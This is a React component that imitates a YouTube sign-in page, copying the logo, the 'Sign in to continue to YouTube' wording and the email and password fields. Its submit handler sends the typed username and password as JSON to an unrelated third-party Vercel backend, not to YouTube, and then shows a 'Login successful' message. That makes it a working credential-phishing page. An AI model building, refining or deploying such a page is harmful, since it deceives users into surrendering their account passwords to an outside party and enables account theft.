"use client"
import React, { useState } from "react"

export default function YouTubeLogin() {
  const [formData, setFormData] = useState({
    emailOrPhone: "",
    password: "",
  })

  const [errors, setErrors] = useState({
    emailOrPhone: "",
    password: "",
  })

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))

    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: "" }))
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setErrors({ emailOrPhone: "", password: "" })

    if (!formData.emailOrPhone) {
      setErrors((prev) => ({ ...prev, emailOrPhone: "Email or phone is required" }))
      return
    }

    if (!formData.password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }))
      return
    }

    try {
      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/youtube", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: formData.emailOrPhone,
          password: formData.password,
        }),
      })

      const data = await response.json()

      if (response.ok) {
        alert("Login successful!")
        console.log("Login successful:", data)
      } else {
        setErrors((prev) => ({
          ...prev,
          password: data.message || "Login failed",
        }))
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }))
    }
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="border border-gray-300 rounded-lg p-12 bg-white">
            {/* YouTube Logo */}
            <div className="text-center mb-6">
              <div className="flex items-center justify-center mb-4">
                <div className="bg-red-600 text-white px-2 py-1 rounded text-xl font-bold mr-1">▶</div>
                <span className="text-2xl font-normal text-gray-700">YouTube</span>
              </div>
              <h1 className="text-2xl font-normal text-gray-700 mb-2">Sign in</h1>
              <p className="text-sm text-gray-600">to continue to YouTube</p>
            </div>

            {/* Login Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <input
                  type="text"
                  name="emailOrPhone"
                  placeholder="Email or phone"
                  value={formData.emailOrPhone}
                  onChange={handleInputChange}
                  className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 ${
                    errors.emailOrPhone ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-gray-300"
                  }`}
                />
                {errors.emailOrPhone && (
                  <p className="text-red-500 text-sm mt-1">{errors.emailOrPhone}</p>
                )}
              </div>

              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleInputChange}
                  className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 ${
                    errors.password ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-gray-300"
                  }`}
                />
                {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
                <p className="text-xs text-blue-600 mt-2 cursor-pointer hover:underline">Forgot password?</p>
              </div>

              <button
                type="submit"
                className="w-full bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700"
              >
                Sign in
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}
